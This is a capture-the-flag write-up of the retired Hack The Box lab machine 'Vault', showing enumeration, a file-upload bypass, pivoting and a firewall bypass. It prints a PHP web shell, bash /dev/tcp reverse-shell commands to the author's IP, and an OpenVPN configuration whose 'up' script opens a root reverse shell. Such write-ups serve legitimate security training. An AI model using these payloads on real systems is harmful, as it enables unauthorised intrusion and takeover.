# Vault

This is the write-up for the box Vault that got retired at the 6th April 2019.
My IP address was 10.10.14.8 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.109    vault.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/vault.nmap 10.10.10.109
```

```markdown
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 a6:9d:0f:7d:73:75:bb:a8:94:0a:b7:e3:fe:1f:24:f4 (RSA)
|   256 2c:7c:34:eb:3a:eb:04:03:ac:48:28:54:09:74:3d:27 (ECDSA)
|_  256 98:42:5f:ad:87:22:92:6d:72:e6:66:6c:82:c1:09:83 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Checking HTTP (Port 80)

The web page shows three lines of text:
```markdown
Welcome to the Slowdaddy web interface

We specialise in providing financial orginisations with strong web and database solutions and we promise to keep your customers financial data safe.

We are proud to announce our first client: Sparklays (Sparklays.com still under construction)
```

With this domain name, it is possible test for **Virtual Host Routing** by putting the domain _sparklays.com_ into the _/etc/hosts_ file, but the page shows the same content.
When browsing to the directory _/sparklays_, it shows an HTTP status code _403 Forbidden_, so this directory exists.

Lets search for hidden directories and files on _/sparklays_ with **Gobuster**:
```markdown
gobuster -u http://10.10.10.109/sparklays dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt
```

Found files and directories:
- _login.php_
  - Shows _"access denied"_
- _admin.php_
  - Shows a login prompt

![Login prompt on admin.php](https://kyuu-ji.github.io/htb-write-up/vault/vault_web-1.png)

- _/design_
  - 403 Forbidden

Searching in _/design_:
```markdown
gobuster -u http://10.10.10.109/sparklays/design dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt
```

Found files and directories:
- _/uploads_
  - 403 Forbidden
- _design.html_
  - Button to _/changelogo.php_
  - Upload feature on _changelogo.php_

![Upload feature on changelogo.php](https://kyuu-ji.github.io/htb-write-up/vault/vault_web-2.png)

Searching in _/uploads_:
```markdown
gobuster -u http://10.10.10.109/sparklays/design/uploads dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt
```

Nothing found in _/uploads_ because there are probably the uploaded files from _/changelogo.php_ saved.

### Checking changelogo.php

Lets upload a PHP file with the following PHP code and send the request to **Burpsuite** to see what the response is:
```markdown
<?php system($_REQUEST['cmd']); ?>
```

It responds by saying that this file type is not allowed, so the _Content-Type_ has to be changed and make the file look like an image:
```markdown
Content-Type: image/gif

GIF8;
<?php system($_REQUEST['cmd']); ?>
```

It is still not allowed, so also changing the file extension:
```markdown
Content-Disposition: form-data; name="file"; filename="cmd.gif"

The file was uploaded successfully
```
```markdown
Content-Disposition: form-data; name="file"; filename="cmd.php5"

The file was uploaded successfully
```

These file extensions were allowed and the PHP5 file can be executed. It is located in _/sparklays/design/uploads/_:
```markdown
GET /sparklays/design/uploads/cmd.php5?cmd=whoami
```

It shows _www-data_ and proofs command execution, so lets start a reverse shell:
```markdown
GET /sparklays/design/uploads/cmd.php5?cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.8/9001 0>&1'

# URL-encoded
GET /sparklays/design/uploads/cmd.php5?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.8/9001+0>%261'
```

After sending the request the listener on my IP and port 9001 starts a reverse shell session as _www-data_.

## Privilege Escalation

When checking the box, it looks like that this is not the target, but some kind of virtual host, as it has several different virtual interfaces and the hostname _ubuntu_.

There are two home directories _/home/alex_ and _/home/dave_.
The user _alex_ has only one file in his home folder:
```markdown
alex/Downloads:                                                                                 
-rw-rw-r-- 1 libvirt-qemu kvm 853540864 Jul 17  2018 server.iso
```

The user _dave_ has some interesting files in his home folder:
```markdown
dave/Desktop:
-rw-rw-r-- 1 alex alex 74 Jul 17  2018 Servers
-rw-rw-r-- 1 alex alex 14 Jul 17  2018 key
-rw-rw-r-- 1 alex alex 20 Jul 17  2018 ssh
```

- Contents of _Servers_
```markdown
DNS + Configurator - 192.168.122.4
Firewall - 192.168.122.5
The Vault - x
```

- Contents of _key_:
```markdown
itscominghome
```

- Contents of _ssh_:
```markdown
dave
Dav3therav3123
```

The password in the _ssh_ file works and privileges got escalated to _dave_ via SSH:
```markdown
ssh dave@10.10.10.109
```

## Enumerating the Network

As we found out, this box is the host for virtual machines. The interface _virbr0_ is a bridge with the IP _192.168.122.1_ and as the _Servers_ file showed, that is the network with the _"The Vault"_.

The IP address of _"The Vault"_ is not shown, so this network should be enumerated by uploading a [static Nmap binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap) onto this box to scan for services:
```markdown
wget 10.10.14.8/static_nmap

chmod +x nmap
```

Scanning _192.168.122.0/24_:
```markdown
./static_nmap 192.168.122.0/24
```
```markdown
Nmap scan report for 192.168.122.1
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http

Nmap scan report for 192.168.122.4
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap scan report for 192.168.122.5
All 1205 scanned ports on 192.168.122.5 are closed
```

To get to the HTTP services, we need to pivot through this box into that network by using **SSH Port Forwarding**.
This [SSH mode](https://www.sans.org/blog/using-the-ssh-konami-code-ssh-control-sequences/) can be activated by pressing _"Alt + ~"_ and then _"Shift + C"_.
```markdown
ssh> -L 8001:192.168.122.4:80
```

The HTTP service of 192.168.122.4 is now accessible on my localhost on port 8001:

![Web page on 192.168.122.4](https://kyuu-ji.github.io/htb-write-up/vault/vault_web-3.png)

### Checking HTTP (Port 80) on 192.168.122.4

The first option _"Click here to modify your DNS Settings"_ forwards to _/dns-config.php_ but results in a _404 Not Found_.

The second option _"Click here to test your VPN Configuration"_ forwards to _/vpnconfig.php_ and is a feature to upload and execute a **.ovpn** file:

![VPN Configurator](https://kyuu-ji.github.io/htb-write-up/vault/vault_web-4.png)

In this [article from Tenable](https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da), it is explained how to execute commands and get a reverse shell via **OpenVPN**.

Lets use the reverse shell and modify it accordingly:
```markdown
remote 192.168.122.1
nobind
dev tun
script-security 2
up "/bin/bash -c '/bin/bash -i > /dev/tcp/192.168.122.1/9002 0<&1 2>&1&'"
```

This will build a VPN tunnel from _192.168.122.1_ to _192.168.122.4_ on port 9002.
So starting a listener on the host via `nc -lvnp 9022` and executing the VPN file by clicking on _"Update File"_ and the listener on the host and port 9002 starts a reverse shell session on _192.168.122.4_ as root.

### Enumerating 192.168.122.4

There are again the same home folders than before, but only _dave_ has one file in his directory called _ssh_ with some more credentials:
```markdown
dave
dav3gerous567
```

After enumerating the box, the IP address of _"The Vault"_ is found in _/etc/hosts_:
```markdown
192.168.5.2     Vault
```

This IP address does not respond to pings but the `ip route` exists:
```markdown
192.168.5.0/24 via 192.168.122.5 dev ens3
192.168.122.0/24 dev ens3  proto kernel  scope link  src 192.168.122.4
```

Maybe it does not respond to ICMP packets, but to other requests, so scanning for services with **Nmap**:
```markdown
nmap -Pn 192.168.5.2 -n
```
```markdown
PORT     STATE  SERVICE
53/tcp   closed domain
4444/tcp closed krb524
```

Even though the ports say "closed", they still respond to the TCP packets for these ports. By setting the source port to 53 on every request, another port scan can be done:
```markdown
nmap -Pn 192.168.5.2 -n --source-port 53
```
```markdown
PORT    STATE SERVICE
987/tcp open  unknown
```

This means by using the source port 53, it is possible to connect to port 987 and with `nc` the banner can be displayed what this service is:
```markdown
nc -p 53 192.168.5.2 987

SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.4
```

It is a SSH service and by using port 53 as the source port, we can connect to port 987 on SSH with the found credentials as _dave_:
```markdown
ssh -p987 -o 'ProxyCommand nc -p 53 %h %p' dave@192.168.5.2
```

## Privilege Escalation to root

The home directory _/home/dave_ has a file called _root.txt.gpg_ which is an **encrypted PGP RSA key**.
```markdown
gpg root.txt.gpg
```
```markdown
encrypted with RSA key, ID D1EB1F03
```

The key with the ID _D1EB1F03_ is needed but the command `gpg --list-keys` does not show any keys.
After searching the other boxes, there is a key with this ID located on the initial box with the IP _10.10.10.109_:

```markdown
dave@ubuntu:~$ gpg --list-keys
/home/dave/.gnupg/pubring.gpg
-----------------------------
pub   4096R/0FDFBFE4 2018-07-24
uid                  david <dave@david.com>
sub   4096R/D1EB1F03 2018-07-24
```

Decoding the key with **Base32**:
```markdown
base32 root.txt.gpg
```

Copying the string into a file on _10.10.10.109_ and decoding it back:
```markdown
base32 -d root.txt.gpg.b64 > root.txt.gpg
```

It asks for a passphrase when trying to decrypt it:
```markdown
dave@ubuntu:~/Documents$ gpg root.txt.gpg

You need a passphrase to unlock the secret key for
user: "david <dave@david.com>"
4096-bit RSA key, ID D1EB1F03, created 2018-07-24 (main key ID 0FDFBFE4)

Enter passphrase:
```

In the beginning there were three files found but the _key_ file with the following content was never used:
```markdown
itscominghome
```

After using this passphrase, the file gets decrypted and the root.txt flag can be read!
